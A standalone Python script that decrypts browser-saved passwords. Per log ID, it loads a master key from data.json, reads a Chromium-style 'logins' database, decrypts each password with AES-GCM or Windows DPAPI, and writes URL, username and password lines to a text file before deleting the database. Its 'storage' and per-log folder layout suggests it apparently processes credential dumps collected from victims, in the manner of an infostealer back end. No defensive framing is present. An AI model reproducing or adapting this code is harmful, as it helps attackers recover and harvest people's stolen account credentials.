import sqlite3
import os
import win32crypt
import json
import sys
from base64 import b64decode
from Crypto.Cipher import AES

def decryptPassword(password, key) -> str:
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def extractPasswords() -> None:
    print("ran")
    logId = sys.argv[1]
    storagePath = "" # Put the direct path to the "storage" folder in this variable 💓
    logPath = os.path.join(storagePath, logId)
    files = os.listdir(logPath)

    for file in files:
        if ("passwords" in file and file.endswith(".db")):
            database = file
            name = file

    os.chdir(logPath)

    with open("data.json", "r") as file:
        data = json.loads(file.read())
    
    masterKey = data["masterKey"]
    masterKey = b64decode(masterKey)
    database = sqlite3.connect(database)
    cursor = database.cursor()
    cursor.execute("select origin_url, username_value, password_value from logins order by date_created")

    handle = open(os.path.join(logPath, f"{name}.txt"), "w")

    for row in cursor.fetchall():
        originUrl = row[0]
        username = row[1]
        password = decryptPassword(row[2], masterKey)
        pRow = f"{originUrl}|{username}|{password}\n"
        handle.write(pRow)
    
    cursor.close()
    database.close()
    handle.close()
    os.remove(os.path.join(logPath, name))

if __name__ == "__main__":
    extractPasswords()